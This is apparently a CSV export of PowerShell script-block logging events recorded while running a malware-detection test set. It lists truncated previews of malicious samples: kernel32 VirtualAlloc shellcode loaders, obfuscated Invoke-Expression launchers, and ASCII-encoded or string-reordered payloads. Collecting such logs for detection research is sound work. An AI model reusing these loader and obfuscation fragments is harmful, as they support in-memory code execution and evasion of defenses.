"TimeCreated","ScriptPath","ScriptLength","ScriptPreview"
"8/6/2026 9:59:37 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:59:37 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:59:37 AM","","2241","$47m = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr"
"8/6/2026 9:59:37 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1354.ps1","21","{ ( [CHar] [INt] $_)}"
"8/6/2026 9:59:37 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1354.ps1","7689","[StRiNg]::jOIN('' , ( '36S52<55b109D32_61<32i39;91T68;108_108<73T109i112b111i114_116;40D34i107D101b114i110{101;108i51_50{46<100<108{108b34T41b93S112{117D98T108_105b99{32T115<116{97_116b105;99{32S101i1"
"8/6/2026 9:59:29 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:59:29 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:59:29 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:59:29 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:59:29 AM","C:\TA\project-ta\data_spliting\test_set\malicious\1354.ps1","2241","$47m = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr"
"8/6/2026 9:59:21 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:59:21 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:59:21 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:59:21 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:59:21 AM","C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\1348.ps1","2453","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 9:59:13 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:59:13 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:59:13 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:59:13 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:59:13 AM","","2446","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 9:59:13 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\1348.ps1","3006","IEX( ((""{14}{39}{27}{33}{4}{7}{31}{1}{48}{29}{42}{0}{30}{45}{15}{44}{50}{22}{19}{38}{37}{2}{34}{43}{16}{9}{26}{41}{46}{12}{5}{40}{10}{3}{18}{28}{17}{32}{13}{6}{20}{23}{35}{11}{49}{21}{25}{24}{47}{36}{"
"8/6/2026 9:59:05 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:59:05 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:59:05 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:59:05 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:59:05 AM","","2446","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 9:59:05 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Concatenation\malicious\1348.ps1","2812","INVOke-eXPREsSioN ((('mSQc = 3dX[DllImport(Frfkernel32.dllFrf)]'+'public static extern IntPtr VirtualAlloc(Int'+'Ptr lpAddress, uint dwSize, uint flAllocationType, u'+'int flProtect);[DllImport(Frfker"
"8/6/2026 9:58:57 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:58:57 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:58:57 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:58:57 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:58:57 AM","","2446","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 9:58:57 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1348.ps1","24","{ ([INt] $_ -AS [chAR])}"
"8/6/2026 9:58:57 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1348.ps1","8291","('36@99o32-61}32:39@91u68g108u108u73}109V112}111-114@116r40u34}107V101}114@110p101}108V51r50o46-100}108V108r34r41r93u112u117u98p108o105:99o32r115u116V97V116p105g99p32}101r120@116-101}114-110g32@73V110"
"8/6/2026 9:58:49 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:58:49 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:58:49 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:58:49 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:58:49 AM","C:\TA\project-ta\data_spliting\test_set\malicious\1348.ps1","2446","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 9:58:41 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:58:41 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:58:41 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:58:41 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:58:41 AM","C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\1340.ps1","2327","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 9:58:33 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:58:33 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:58:33 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:58:33 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:58:33 AM","","2321","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 9:58:33 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\1340.ps1","2893","(((""{43}{36}{41}{24}{45}{30}{13}{21}{3}{23}{0}{1}{19}{17}{48}{40}{27}{8}{12}{29}{6}{5}{33}{11}{38}{7}{26}{46}{44}{39}{15}{20}{25}{2}{47}{9}{28}{18}{16}{4}{37}{32}{22}{34}{35}{31}{10}{42}{14}"" -f 'asst"
"8/6/2026 9:58:25 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:58:25 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:58:25 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:58:25 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:58:25 AM","","2321","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 9:58:25 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Concatenation\malicious\1340.ps1","2707","invOke-ExPREsSIoN ((('3GJc = zeW'+'[DllImport(rJekernel32.dl'+'lrJe)]public static ext'+'ern IntPtr VirtualAlloc(IntPtr lpAddress, uint '+'dwSize'+', uint flAllocationType, uint flProtect);[DllImport("
"8/6/2026 9:58:17 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:58:17 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:58:17 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:58:17 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:58:17 AM","","2321","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 9:58:17 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1340.ps1","23","{ ( [inT]$_ -As[cHar])}"
"8/6/2026 9:58:16 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1340.ps1","7996","&( $SHellid[1]+$SHELliD[13]+'x') ([stRinG]::JoIN( '' , ( '36D99x32&61b32U39D91x68t108x108b73U109t112D111>114&116D40r34U107>101U114x110D101t108n51a50t46r100D108b108x34&41t93x112r117U98n108n105U99&32t11"
"8/6/2026 9:58:09 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:58:09 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:58:09 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:58:09 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:58:08 AM","C:\TA\project-ta\data_spliting\test_set\malicious\1340.ps1","2321","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 9:58:01 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:58:01 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:58:01 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:58:01 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:58:00 AM","C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\1305.ps1","2347","$8KN8nB = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern Int"
"8/6/2026 9:57:53 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:57:53 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:57:53 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:57:53 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:57:53 AM","","2340","$8KN8nB = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern Int"
"8/6/2026 9:57:52 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\1305.ps1","3048"," (((""{47}{9}{27}{51}{68}{19}{14}{46}{41}{38}{49}{60}{35}{61}{34}{53}{63}{1}{44}{39}{36}{11}{72}{69}{3}{31}{50}{43}{33}{12}{62}{32}{66}{6}{13}{59}{57}{37}{54}{71}{21}{29}{22}{58}{10}{17}{70}{7}{4}{45}{"
"8/6/2026 9:57:45 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:57:45 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:57:45 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:57:45 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:57:45 AM","","2340","$8KN8nB = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern Int"
"8/6/2026 9:57:44 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Concatenation\malicious\1305.ps1","2759","& ( $eNV:comspeC[4,24,25]-join'') ( ('xK18KN8nB = tR8[DllImport(hmakernel32.dllhma)]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocati'+'onType, uint flProtect);'+"
"8/6/2026 9:57:37 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:57:37 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:57:37 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:57:37 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:57:37 AM","","2340","$8KN8nB = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern Int"
"8/6/2026 9:57:36 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1305.ps1","23","{( [iNT] $_-AS[CHAr]) }"
"8/6/2026 9:57:36 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1305.ps1","7972","-Join ( '36T56T75,78T56,110D66R32G61~32Q39k91~68,108,108R73k109,112R111Q114G116D40T34Q107k101,114R110X101G108Q51G50T46X100Q108D108~34k41T93D112D117~98R108X105D99,32k115Z116D97Q116~105X99k32Z101~120k11"
"8/6/2026 9:57:29 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:57:29 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:57:29 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:57:29 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:57:28 AM","C:\TA\project-ta\data_spliting\test_set\malicious\1305.ps1","2340","$8KN8nB = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern Int"
"8/6/2026 9:57:21 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:57:21 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:57:21 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:57:21 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:57:20 AM","C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\13.ps1","2252","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 9:57:13 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:57:13 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:57:13 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:57:13 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:57:12 AM","","2245","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 9:57:12 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\13.ps1","2788"," ((""{45}{27}{34}{8}{25}{10}{1}{41}{30}{21}{35}{5}{40}{15}{20}{28}{22}{38}{13}{6}{18}{14}{24}{37}{26}{46}{36}{16}{29}{7}{42}{0}{31}{33}{23}{9}{44}{11}{32}{2}{12}{17}{43}{19}{39}{4}{3}""-f 'f,0xd5,0x97,0"
"8/6/2026 9:57:05 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:57:05 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:57:05 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:57:05 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:57:04 AM","","2245","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 9:57:04 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Concatenation\malicious\13.ps1","2678",". ( $ENV:coMSPeC[4,24,25]-joIn'')((('y7zc = YBg[DllImport(iC'+'wkernel32.dlliCw)]public static extern IntPtr'+' VirtualAll'+'oc(IntPtr lpAd'+'dress, uint dwSize, uint flAll'+'ocationType, uint flProte"
"8/6/2026 9:56:57 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:56:57 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:56:57 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:56:57 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:56:56 AM","","2245","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 9:56:56 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\13.ps1","19","{([CHar] [iNT] $_)}"
"8/6/2026 9:56:56 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\13.ps1","7664","[stRIng]::joIn('' ,('36b99k32P61A32P39Z91v68&108_108b73k109P112_111b114Z116v40b34Z107v101_114I110A101F108b51v50_46Z100b108_108b34k41F93_112b117Z98A108P105_99k32Z115A116I97&116b105F99P32I101_120I116Z10"
"8/6/2026 9:56:49 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:56:49 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:56:49 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:56:49 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:56:48 AM","C:\TA\project-ta\data_spliting\test_set\malicious\13.ps1","2245","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 9:56:40 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:56:40 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:56:40 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:56:40 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:56:40 AM","C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\1299.ps1","2328","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 9:56:32 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:56:32 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:56:32 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:56:32 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:56:32 AM","","2321","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 9:56:32 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\1299.ps1","3102","& ( $PShoME[4]+$PShoME[34]+'x') ( ((""{44}{39}{14}{48}{3}{61}{15}{22}{1}{51}{28}{33}{34}{40}{24}{69}{49}{23}{21}{58}{71}{45}{32}{19}{64}{7}{12}{36}{31}{63}{66}{2}{62}{41}{47}{38}{20}{0}{10}{50}{65}{13}"
"8/6/2026 9:56:24 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:56:24 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:56:24 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:56:24 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:56:24 AM","","2321","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 9:56:24 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Concatenation\malicious\1299.ps1","2698"," .( $eNv:COMSpEc[4,24,25]-JoIN'') ((('jhmc '+'= DkF[DllImport(1zykernel32.dll1zy)]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImp"
"8/6/2026 9:56:16 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:56:16 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
